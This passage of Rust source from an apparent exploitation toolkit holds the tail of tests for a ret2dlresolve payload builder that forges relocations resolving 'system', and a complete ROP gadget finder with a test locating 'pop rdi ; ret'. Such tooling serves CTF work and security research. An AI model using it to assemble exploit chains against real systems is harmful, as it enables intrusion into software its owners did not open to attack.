        assert_eq!(&p.bytes[name_o..name_o + 6], b"system");
        assert_eq!(p.bytes[name_o + 6], 0); // NUL-terminated
    }

    #[test]
    fn aligned_write_to_gives_index_zero_offset() {
        // write_to exactly rela_plt + N*24 -> reloc_index is that N with no extra padding.
        let rela_plt = 0x400460;
        let write_to = rela_plt + 10 * ENT;
        let p = build(0x400370, 0x400400, rela_plt, write_to, write_to, "system").unwrap();
        assert_eq!(p.reloc_index, 10);
    }
}

`crates/orress-pwn/src/rop.rs`:

```rs
//! A ROP gadget finder: scan a binary's executable bytes for short instruction sequences that end
//! in a `ret` (or `syscall`), the building blocks of a return-oriented-programming chain.

use orress_arch::{Flow, Isa, decode};

/// One gadget: its virtual address and its instructions as text (`"pop rdi ; ret"`).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Gadget {
    pub addr: u64,
    pub text: String,
}

/// How far back (in bytes) from a terminator to look for a gadget start.
fn max_back(max_insns: usize) -> usize {
    max_insns * 10
}

/// A gadget terminator and its byte length.
struct Terminator {
    offset: usize,
    len: usize,
}

/// Finds every gadget in `sections` (each `(virtual base, bytes)`), up to `max_insns` instructions
/// before the terminator. Results are unique by address and sorted.
pub fn find_gadgets(sections: &[(u64, &[u8])], isa: Isa, max_insns: usize) -> Vec<Gadget> {
    let mut out = Vec::new();
    for &(base, bytes) in sections {
        for term in terminators(bytes) {
            let back = term.offset.saturating_sub(max_back(max_insns));
            for start in back..=term.offset {
                if let Some(text) = gadget_at(bytes, base, isa, start, &term, max_insns) {
                    out.push(Gadget {
                        addr: base + start as u64,
                        text,
                    });
                }
            }
        }
    }
    out.sort_by_key(|g| g.addr);
    out.dedup_by_key(|g| g.addr);
    out
}

/// The offsets of gadget terminators in `bytes`: `ret` (0xc3), `ret imm16` (0xc2) and `syscall`
/// (0f 05). A given start can only reach the first terminator it hits (a `ret` in the middle breaks
/// the chain), so terminators never produce duplicate gadget addresses.
fn terminators(bytes: &[u8]) -> Vec<Terminator> {
    let mut t: Vec<Terminator> = Vec::new();
    for off in memchr::memchr_iter(0xc3, bytes) {
        t.push(Terminator {
            offset: off,
            len: 1,
        });
    }
    for off in memchr::memchr_iter(0xc2, bytes) {
        t.push(Terminator {
            offset: off,
            len: 3,
        });
    }
    for off in memchr::memmem::find_iter(bytes, &[0x0f, 0x05]) {
        t.push(Terminator {
            offset: off,
            len: 2,
        });
    }
    t
}

/// A window of up to 15 bytes starting at `pos` (enough for any x86 instruction).
fn window(bytes: &[u8], pos: usize) -> &[u8] {
    &bytes[pos..(pos + 15).min(bytes.len())]
}

/// Tries to read a gadget from `start` up to and including the terminator at `term.offset`:
/// every instruction before the terminator must be a plain (non-branching) instruction, the chain
/// must land exactly on the terminator, and there must be at most `max_insns` of them.
fn gadget_at(
    bytes: &[u8],
    base: u64,
    isa: Isa,
    start: usize,
    term: &Terminator,
    max_insns: usize,
) -> Option<String> {
    let mut pos = start;
    let mut parts: Vec<String> = Vec::new();
    while pos < term.offset {
        if parts.len() >= max_insns {
            return None;
        }
        let insn = decode(isa, window(bytes, pos), base + pos as u64)?;
        if insn.len == 0 || !matches!(insn.flow, Flow::Next) {
            return None; // zero-length, or a branch/stop before the terminator
        }
        parts.push(insn.text());
        pos += usize::from(insn.len);
    }
    if pos != term.offset {
        return None; // the last instruction overran the terminator
    }
    let term_insn = decode(isa, window(bytes, term.offset), base + term.offset as u64)?;
    if usize::from(term_insn.len) != term.len {
        return None;
    }
    parts.push(term_insn.text());
    Some(parts.join(" ; "))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Assembles x86-64 and returns the bytes.
    fn asm(src: &str) -> Vec<u8> {
        orress_asm::assemble(src, orress_asm::Arch::X64, 0)
            .expect("assemble")
            .bytes
    }

    #[test]
    fn finds_pop_rdi_ret_and_syscall() {
        // A blob with a classic `pop rdi ; ret` and a `syscall` gadget.
        let bytes = asm("pop rdi\nret\nsyscall\nret\nnop");
        let gadgets = find_gadgets(&[(0x400000, &bytes)], Isa::X64, 6);
        assert!(
            gadgets.iter().any(|g| g.text == "pop rdi ; ret"),
            "gadgets: {:?}",
            gadgets.iter().map(|g| &g.text).collect::<Vec<_>>()
        );
        assert!(gadgets.iter().any(|g| g.text == "ret"));
        assert!(gadgets.iter().any(|g| g.text.starts_with("syscall")));
        // Addresses are real (base-relative) and unique.
        let addrs: std::collections::HashSet<u64> = gadgets.iter().map(|g| g.addr).collect();
        assert_eq!(addrs.len(), gadgets.len());
    }
}
